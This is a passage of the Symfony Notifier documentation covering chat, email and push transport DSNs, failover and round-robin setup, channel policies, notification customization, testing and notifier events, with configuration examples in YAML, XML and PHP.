``googlechat://ACCESS_KEY:ACCESS_TOKEN@default/SPACE?thread_key=THREAD_KEY``\n`LINE Notify`_                           ``symfony/line-notify-notifier``      ``linenotify://TOKEN@default``\n`LinkedIn`_                              ``symfony/linked-in-notifier``        ``linkedin://TOKEN:USER_ID@default``\n`Mastodon`_                              ``symfony/mastodon-notifier``         ``mastodon://ACCESS_TOKEN@HOST``\n`Mattermost`_                            ``symfony/mattermost-notifier``       ``mattermost://ACCESS_TOKEN@HOST/PATH?channel=CHANNEL``\n`Mercure`_                               ``symfony/mercure-notifier``          ``mercure://HUB_ID?topic=TOPIC``\n`MicrosoftTeams`_                        ``symfony/microsoft-teams-notifier``  ``microsoftteams://default/PATH``\n`RocketChat`_                            ``symfony/rocket-chat-notifier``      ``rocketchat://TOKEN@ENDPOINT?channel=CHANNEL``\n`Slack`_                                 ``symfony/slack-notifier``            ``slack://TOKEN@default?channel=CHANNEL``\n`Telegram`_                              ``symfony/telegram-notifier``         ``telegram://TOKEN@default?channel=CHAT_ID``\n`Twitter`_                               ``symfony/twitter-notifier``          ``twitter://API_KEY:API_SECRET:ACCESS_TOKEN:ACCESS_SECRET@default``\n`Zendesk`_                               ``symfony/zendesk-notifier``          ``zendesk://EMAIL:TOKEN@SUBDOMAIN``\n`Zulip`_                                 ``symfony/zulip-notifier``            ``zulip://EMAIL:TOKEN@HOST?channel=CHANNEL``\n======================================   ====================================  =============================================================================\n\n.. versionadded:: 7.1\n\n    The ``Bluesky`` integration was introduced in Symfony 7.1.\n\n.. warning::\n\n    By default, if you have the :doc:`Messenger component </messenger>` installed,\n    the notifications will be sent through the MessageBus. If you don't have a\n    message consumer running, messages will never be sent.\n\n    To change this behavior, add the following configuration to send messages\n    directly via the transport:\n\n    .. code-block:: yaml\n\n        # config/packages/notifier.yaml\n        framework:\n            notifier:\n                message_bus: false\n\nChatters are configured using the ``chatter_transports`` setting:\n\n.. code-block:: bash\n\n    # .env\n    SLACK_DSN=slack://TOKEN@default?channel=CHANNEL\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/notifier.yaml\n        framework:\n            notifier:\n                chatter_transports:\n                    slack: '%env(SLACK_DSN)%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/notifier.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:notifier>\n                    <framework:chatter-transport name=\"slack\">\n                        %env(SLACK_DSN)%\n                    </framework:chatter-transport>\n                </framework:notifier>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/notifier.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->notifier()\n                ->chatterTransport('slack', env('SLACK_DSN'))\n            ;\n        };\n\n.. _sending-chat-messages:\n\nThe :class:`Symfony\\\\Component\\\\Notifier\\\\ChatterInterface` class allows\nyou to send messages to chat services::\n\n    // src/Controller/CheckoutController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Notifier\\ChatterInterface;\n    use Symfony\\Component\\Notifier\\Message\\ChatMessage;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class CheckoutController extends AbstractController\n    {\n        #[Route('/checkout/thankyou')]\n        public function thankyou(ChatterInterface $chatter): Response\n        {\n            $message = (new ChatMessage('You got a new invoice for 15 EUR.'))\n                // if not set explicitly, the message is sent to the\n                // default transport (the first one configured)\n                ->transport('slack');\n\n            $sentMessage = $chatter->send($message);\n\n            // ...\n        }\n    }\n\nThe ``send()`` method returns a variable of type\n:class:`Symfony\\\\Component\\\\Notifier\\\\Message\\\\SentMessage` which provides\ninformation such as the message ID and the original message contents.\n\n.. _notifier-email-channel:\n\nEmail Channel\n~~~~~~~~~~~~~\n\nThe email channel uses the :doc:`Symfony Mailer </mailer>` to send\nnotifications using the special\n:class:`Symfony\\\\Bridge\\\\Twig\\\\Mime\\\\NotificationEmail`. It is\nrequired to install the Twig bridge along with the Inky and CSS Inliner\nTwig extensions:\n\n.. code-block:: terminal\n\n    $ composer require symfony/twig-pack twig/cssinliner-extra twig/inky-extra\n\nAfter this, :ref:`configure the mailer <mailer-transport-setup>`. You can\nalso set the default \"from\" email address that should be used to send the\nnotification emails:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mailer.yaml\n        framework:\n            mailer:\n                dsn: '%env(MAILER_DSN)%'\n                envelope:\n                    sender: 'notifications@example.com'\n\n    .. code-block:: xml\n\n        <!-- config/packages/mailer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:mailer\n                    dsn=\"%env(MAILER_DSN)%\"\n                >\n                    <framework:envelope\n                        sender=\"notifications@example.com\"\n                    />\n                </framework:mailer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/mailer.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->mailer()\n                ->dsn(env('MAILER_DSN'))\n                ->envelope()\n                    ->sender('notifications@example.com')\n            ;\n        };\n\n.. _notifier-push-channel:\n\nPush Channel\n~~~~~~~~~~~~\n\n.. warning::\n\n    If any of the DSN values contains any character considered special in a\n    URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``), you must\n    encode them. See `RFC 3986`_ for the full list of reserved characters or use the\n    :phpfunction:`urlencode` function to encode them.\n\nThe push channel is used to send notifications to users by using\n:class:`Symfony\\\\Component\\\\Notifier\\\\Texter` classes. Symfony provides\nintegration with these push services:\n\n===============  ====================================  ==============================================================================\nService          Package                               DSN\n===============  ====================================  ==============================================================================\n`Engagespot`_    ``symfony/engagespot-notifier``       ``engagespot://API_KEY@default?campaign_name=CAMPAIGN_NAME``\n`Expo`_          ``symfony/expo-notifier``             ``expo://Token@default``\n`Novu`_          ``symfony/novu-notifier``             ``novu://API_KEY@default``\n`Ntfy`_          ``symfony/ntfy-notifier``             ``ntfy://default/TOPIC``\n`OneSignal`_     ``symfony/one-signal-notifier``       ``onesignal://APP_ID:API_KEY@default?defaultRecipientId=DEFAULT_RECIPIENT_ID``\n`PagerDuty`_     ``symfony/pager-duty-notifier``       ``pagerduty://TOKEN@SUBDOMAIN``\n`Pushover`_      ``symfony/pushover-notifier``         ``pushover://USER_KEY:APP_TOKEN@default``\n`Pushy`_         ``symfony/pushy-notifier``            ``pushy://API_KEY@default``\n===============  ====================================  ==============================================================================\n\nTo enable a texter, add the correct DSN in your ``.env`` file and\nconfigure the ``texter_transports``:\n\n.. versionadded:: 7.1\n\n    The `Pushy`_ integration was introduced in Symfony 7.1.\n\n.. code-block:: bash\n\n    # .env\n    EXPO_DSN=expo://TOKEN@default\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/notifier.yaml\n        framework:\n            notifier:\n                texter_transports:\n                    expo: '%env(EXPO_DSN)%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/notifier.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:notifier>\n                    <framework:texter-transport name=\"expo\">\n                        %env(EXPO_DSN)%\n                    </framework:texter-transport>\n                </framework:notifier>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/notifier.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->notifier()\n                ->texterTransport('expo', env('EXPO_DSN'))\n            ;\n        };\n\nConfigure to use Failover or Round-Robin Transports\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBesides configuring one or more separate transports, you can also use the\nspecial ``||`` and ``&&`` characters to implement a failover or round-robin\ntransport:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/notifier.yaml\n        framework:\n            notifier:\n                chatter_transports:\n                    # Send notifications to Slack and use Telegram if\n                    # Slack errored\n                    main: '%env(SLACK_DSN)% || %env(TELEGRAM_DSN)%'\n\n                    # Send notifications to the next scheduled transport calculated by round robin\n                    roundrobin: '%env(SLACK_DSN)% && %env(TELEGRAM_DSN)%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/notifier.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:notifier>\n                    <!-- Send notifications to Slack and use Telegram if\n                         Slack errored -->\n                    <framework:chatter-transport name=\"slack\">\n                        %env(SLACK_DSN)% || %env(TELEGRAM_DSN)%\n                    </framework:chatter-transport>\n\n                    <!-- Send notifications to the next scheduled transport\n                         calculated by round robin -->\n                    <framework:chatter-transport name=\"slack\"><![CDATA[\n                        %env(SLACK_DSN)% && %env(TELEGRAM_DSN)%\n                    ]]></framework:chatter-transport>\n                </framework:notifier>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/notifier.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->notifier()\n                // Send notifications to Slack and use Telegram if\n                // Slack errored\n                ->chatterTransport('main', env('SLACK_DSN').' || '.env('TELEGRAM_DSN'))\n\n                // Send notifications to the next scheduled transport calculated by round robin\n                ->chatterTransport('roundrobin', env('SLACK_DSN').' && '.env('TELEGRAM_DSN'))\n            ;\n        };\n\nCreating & Sending Notifications\n--------------------------------\n\nTo send a notification, autowire the\n:class:`Symfony\\\\Component\\\\Notifier\\\\NotifierInterface` (service ID\n``notifier``). This class has a ``send()`` method that allows you to send a\n:class:`Symfony\\\\Component\\\\Notifier\\\\Notification\\\\Notification` to a\n:class:`Symfony\\\\Component\\\\Notifier\\\\Recipient\\\\Recipient`::\n\n    // src/Controller/InvoiceController.php\n    namespace App\\Controller;\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Notifier\\Notification\\Notification;\n    use Symfony\\Component\\Notifier\\NotifierInterface;\n    use Symfony\\Component\\Notifier\\Recipient\\Recipient;\n\n    class InvoiceController extends AbstractController\n    {\n        #[Route('/invoice/create')]\n        public function create(NotifierInterface $notifier): Response\n        {\n            // ...\n\n            // Create a Notification that has to be sent\n            // using the \"email\" channel\n            $notification = (new Notification('New Invoice', ['email']))\n                ->content('You got a new invoice for 15 EUR.');\n\n            // The receiver of the Notification\n            $recipient = new Recipient(\n                $user->getEmail(),\n                $user->getPhonenumber()\n            );\n\n            // Send the notification to the recipient\n            $notifier->send($notification, $recipient);\n\n            // ...\n        }\n    }\n\nThe ``Notification`` is created by using two arguments: the subject and\nchannels. The channels specify which channel (or transport) should be used\nto send the notification. For instance, ``['email', 'sms']`` will send\nboth an email and sms notification to the user.\n\nThe default notification also has a ``content()`` and ``emoji()`` method to\nset the notification content and icon.\n\nSymfony provides the following recipients:\n\n:class:`Symfony\\\\Component\\\\Notifier\\\\Recipient\\\\NoRecipient`\n    This is the default and is useful when there is no need to have\n    information about the receiver. For example, the browser channel uses\n    the current requests' :ref:`session flashbag <flash-messages>`;\n\n:class:`Symfony\\\\Component\\\\Notifier\\\\Recipient\\\\Recipient`\n    This can contain both the email address and the phone number of the user. This\n    recipient can be used for all channels (depending on whether they are\n    actually set).\n\nConfiguring Channel Policies\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of specifying the target channels on creation, Symfony also allows\nyou to use notification importance levels. Update the configuration to\nspecify what channels should be used for specific levels (using\n``channel_policy``):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/notifier.yaml\n        framework:\n            notifier:\n                # ...\n                channel_policy:\n                    # Use SMS, Slack and email for urgent notifications\n                    urgent: ['sms', 'chat/slack', 'email']\n\n                    # Use Slack for highly important notifications\n                    high: ['chat/slack']\n\n                    # Use browser for medium and low notifications\n                    medium: ['browser']\n                    low: ['browser']\n\n    .. code-block:: xml\n\n        <!-- config/packages/notifier.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:notifier>\n                    <!-- ... -->\n\n                    <framework:channel-policy>\n                        <!-- Use SMS, Slack and Email for urgent notifications -->\n                        <framework:urgent>sms</framework:urgent>\n                        <framework:urgent>chat/slack</framework:urgent>\n                        <framework:urgent>email</framework:urgent>\n\n                        <!-- Use Slack for highly important notifications -->\n                        <framework:high>chat/slack</framework:high>\n\n                        <!-- Use browser for medium and low notifications -->\n                        <framework:medium>browser</framework:medium>\n                        <framework:low>browser</framework:low>\n                    </framework:channel-policy>\n                </framework:notifier>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/notifier.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->notifier()\n                // Use SMS, Slack and email for urgent notifications\n                ->channelPolicy('urgent', ['sms', 'chat/slack', 'email'])\n                // Use Slack for highly important notifications\n                ->channelPolicy('high', ['chat/slack'])\n                // Use browser for medium and low notifications\n                ->channelPolicy('medium', ['browser'])\n                ->channelPolicy('low', ['browser'])\n            ;\n        };\n\nNow, whenever the notification's importance is set to \"high\", it will be\nsent using the Slack transport::\n\n    // ...\n    class InvoiceController extends AbstractController\n    {\n        #[Route('/invoice/create')]\n        public function invoice(NotifierInterface $notifier): Response\n        {\n            // ...\n\n            $notification = (new Notification('New Invoice'))\n                ->content('You got a new invoice for 15 EUR.')\n                ->importance(Notification::IMPORTANCE_HIGH);\n\n            $notifier->send($notification, new Recipient('wouter@example.com'));\n\n            // ...\n        }\n    }\n\nCustomize Notifications\n-----------------------\n\nYou can extend the ``Notification`` or ``Recipient`` base classes to\ncustomize their behavior. For instance, you can overwrite the\n``getChannels()`` method to only return ``sms`` if the invoice price is\nvery high and the recipient has a phone number::\n\n    namespace App\\Notifier;\n\n    use Symfony\\Component\\Notifier\\Notification\\Notification;\n    use Symfony\\Component\\Notifier\\Recipient\\RecipientInterface;\n    use Symfony\\Component\\Notifier\\Recipient\\SmsRecipientInterface;\n\n    class InvoiceNotification extends Notification\n    {\n        public function __construct(\n            private int $price,\n        ) {\n        }\n\n        public function getChannels(RecipientInterface $recipient): array\n        {\n            if (\n                $this->price > 10000\n                && $recipient instanceof SmsRecipientInterface\n            ) {\n                return ['sms'];\n            }\n\n            return ['email'];\n        }\n    }\n\nCustomize Notification Messages\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nEach channel has its own notification interface that you can implement to\ncustomize the notification message. For instance, if you want to modify the\nmessage based on the chat service, implement\n:class:`Symfony\\\\Component\\\\Notifier\\\\Notification\\\\ChatNotificationInterface`\nand its ``asChatMessage()`` method::\n\n    // src/Notifier/InvoiceNotification.php\n    namespace App\\Notifier;\n\n    use Symfony\\Component\\Notifier\\Message\\ChatMessage;\n    use Symfony\\Component\\Notifier\\Notification\\ChatNotificationInterface;\n    use Symfony\\Component\\Notifier\\Notification\\Notification;\n    use Symfony\\Component\\Notifier\\Recipient\\RecipientInterface;\n\n    class InvoiceNotification extends Notification implements ChatNotificationInterface\n    {\n        public function __construct(\n            private int $price,\n        ) {\n        }\n\n        public function asChatMessage(RecipientInterface $recipient, ?string $transport = null): ?ChatMessage\n        {\n            // Add a custom subject and emoji if the message is sent to Slack\n            if ('slack' === $transport) {\n                $this->subject('You\\'re invoiced '.strval($this->price).' EUR.');\n                $this->emoji(\"money\");\n                return ChatMessage::fromNotification($this);\n            }\n\n            // If you return null, the Notifier will create the ChatMessage\n            // based on this notification as it would without this method.\n            return null;\n        }\n    }\n\nThe\n:class:`Symfony\\\\Component\\\\Notifier\\\\Notification\\\\SmsNotificationInterface`,\n:class:`Symfony\\\\Component\\\\Notifier\\\\Notification\\\\EmailNotificationInterface`\nand\n:class:`Symfony\\\\Component\\\\Notifier\\\\Notification\\\\PushNotificationInterface`\nalso exists to modify messages sent to those channels.\n\nCustomize Browser Notifications (Flash Messages)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe default behavior for browser channel notifications is to add a\n:ref:`flash message <flash-messages>` with ``notification`` as its key.\n\nHowever, you might prefer to map the importance level of the notification to the\ntype of flash message, so you can tweak their style.\n\nYou can do that by overriding the default ``notifier.flash_message_importance_mapper``\nservice with your own implementation of\n:class:`Symfony\\\\Component\\\\Notifier\\\\FlashMessage\\\\FlashMessageImportanceMapperInterface`\nwhere you can provide your own \"importance\" to \"alert level\" mapping.\n\nSymfony currently provides an implementation for the Bootstrap CSS framework's\ntypical alert levels, which you can implement immediately using:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            notifier.flash_message_importance_mapper:\n                class: Symfony\\Component\\Notifier\\FlashMessage\\BootstrapFlashMessageImportanceMapper\n\n    .. code-block:: xml\n\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"notifier.flash_message_importance_mapper\" class=\"Symfony\\Component\\Notifier\\FlashMessage\\BootstrapFlashMessageImportanceMapper\"/>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Symfony\\Component\\Notifier\\FlashMessage\\BootstrapFlashMessageImportanceMapper;\n\n        return function(ContainerConfigurator $containerConfigurator) {\n            $containerConfigurator->services()\n                ->set('notifier.flash_message_importance_mapper', BootstrapFlashMessageImportanceMapper::class)\n            ;\n        };\n\nTesting Notifier\n----------------\n\nSymfony provides a :class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\NotificationAssertionsTrait`\nwhich provide useful methods for testing your Notifier implementation.\nYou can benefit from this class by using it directly or extending the\n:class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\KernelTestCase`.\n\nSee :ref:`testing documentation <notifier-assertions>` for the list of available assertions.\n\nDisabling Delivery\n------------------\n\nWhile developing (or testing), you may want to disable delivery of notifications\nentirely. You can do this by forcing Notifier to use the ``NullTransport`` for\nall configured texter and chatter transports only in the ``dev`` (and/or\n``test``) environment:\n\n.. code-block:: yaml\n\n    # config/packages/dev/notifier.yaml\n    framework:\n        notifier:\n            texter_transports:\n                twilio: 'null://null'\n            chatter_transports:\n                slack: 'null://null'\n\n.. _notifier-events:\n\nUsing Events\n------------\n\nThe :class:`Symfony\\\\Component\\\\Notifier\\\\Transport` class of the Notifier component\nallows you to optionally hook into the lifecycle via events.\n\nThe ``MessageEvent`` Event\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n**Typical Purposes**: Doing something before the message is sent (like logging\nwhich message is going to be sent, or displaying something about the event\nto be executed.\n\nJust before sending the message, the event class ``MessageEvent`` is\ndispatched. Listeners receive a\n:class:`Symfony\\\\Component\\\\Notifier\\\\Event\\\\MessageEvent` event::\n\n    use Symfony\\Component\\Notifier\\Event\\MessageEvent;\n\n    $dispatcher->addListener(MessageEvent::class, function (MessageEvent $event): void {\n        // gets the message instance\n        $message = $event->getMessage();\n\n        // log something\n        $this->logger(sprintf('Message with subject: %s will be send to %s', $message->getSubject(), $message->getRecipientId()));\n    });\n\nThe ``FailedMessageEvent`` Event\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n**Typical Purposes**: Doing something before the exception is thrown\n(Retry to send the message or log additional information).\n\nWhenever an exception is thrown while sending the message, the event class\n``FailedMessageEvent`` is dispatched. A listener can do anything useful before\nthe exception is thrown.\n\nListeners receive a\n:class:`Symfony\\\\Component\\\\Notifier\\\\Event\\\\FailedMessageEvent` event::\n\n    use Symfony\\Component\\Notifier\\Event\\FailedMessageEvent;\n\n    $dispatcher->addListener(FailedMessageEvent::class, function (FailedMessageEvent $event): void {\n        // gets the message instance\n        $message = $event->getMessage();\n\n        // gets the error instance\n        $error = $event->getError();\n\n        // log something\n        $this->logger(sprintf('The message with subject: %s has not been sent successfully. The error is: %s', $message->getSubject(), $error->getMessage()));\n    });\n\nThe ``SentMessageEvent`` Event\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n**Typical Purposes**: To perform some action when the message is successfully\nsent (like retrieve the id returned when the message is sent).\n\nAfter the message has been successfully sent, the event class ``SentMessageEvent``\nis dispatched. Listeners receive a\n:class:`Symfony\\\\Component\\\\Notifier\\\\Event\\\\SentMessageEvent` event::\n\n    use Symfony\\Component\\Notifier\\Event\\SentMessageEvent;\n\n    $dispatcher->addListener(SentMessageEvent::class, function (SentMessageEvent $event): void {\n        // gets the message instance\n        $message = $event->getMessage();\n\n        // log something\n        $this->logger(sprintf('The message has been successfully sent and has id: %s', $message->getMessageId()));\n    });\n\n.. TODO\n..    - Using the message bus for asynchronous notification\n..    - Describe notifier monolog handler\n..    - Describe notification_on_failed_messages integration\n\n.. _`46elks`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/FortySixElks/README.md\n.. _`AllMySms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/AllMySms/README.md\n.. _`AmazonSns`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/AmazonSns/README.md\n.. _`Bandwidth`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Bandwidth/README.md\n.. _`Bluesky`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Bluesky/README.md\n.. _`Brevo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Brevo/README.md\n.. _`Chatwork`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Chatwork/README.md\n.. _`Clickatell`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Clickatell/README.md\n.. _`ContactEveryone`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/ContactEveryone/README.md\n.. _`Discord`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Discord/README.md\n.. _`Engagespot`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Engagespot/README.md\n.. _`Esendex`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Esendex/README.md\n.. _`Expo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Expo/README.md\n.. _`FakeChat`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/FakeChat/README.md\n.. _`FakeSms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/FakeSms/README.md\n.. _`Firebase`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Firebase/README.md\n.. _`FreeMobile`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/FreeMobile/README.md\n.. _`GatewayApi`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/GatewayApi/README.md\n.. _`Gitter`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Gitter/README.md\n.. _`GoIP`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/GoIp/README.md\n.. _`GoogleChat`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/GoogleChat/README.md\n.. _`Infobip`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Infobip/README.md\n.. _`Iqsms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Iqsms/README.md\n.. _`iSendPro`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Isendpro/README.md\n.. _`KazInfoTeh`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/KazInfoTeh/README.md\n.. _`LINE Notify`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/LineNotify/README.md\n.. _`LightSms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/LightSms/README.md\n.. _`LinkedIn`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/LinkedIn/README.md\n.. _`LOX24`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Lox24/README.md\n.. _`Mailjet`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mailjet/README.md\n.. _`Mastodon`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mastodon/README.md\n.. _`Mattermost`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mattermost/README.md\n.. _`Mercure`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mercure/README.md\n.. _`MessageBird`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/MessageBird/README.md\n.. _`MessageMedia`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/MessageMedia/README.md\n.. _`MicrosoftTeams`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/MicrosoftTeams/README.md\n.. _`Mobyt`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Mobyt/README.md\n.. _`Nexmo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Nexmo/README.md\n.. _`Novu`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Novu/README.md\n.. _`Ntfy`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Ntfy/README.md\n.. _`Octopush`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Octopush/README.md\n.. _`OneSignal`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/OneSignal/README.md\n.. _`OrangeSms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/OrangeSms/README.md\n.. _`OvhCloud`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/OvhCloud/README.md\n.. _`PagerDuty`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/PagerDuty/README.md\n.. _`Plivo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Plivo/README.md\n.. _`Pushover`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Pushover/README.md\n.. _`Pushy`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Pushy/README.md\n.. _`Redlink`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Redlink/README.md\n.. _`RFC 3986`: https://www.ietf.org/rfc/rfc3986.txt\n.. _`RingCentral`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/RingCentral/README.md\n.. _`RocketChat`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/RocketChat/README.md\n.. _`SMSFactor`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SmsFactor/README.md\n.. _`Sendberry`: 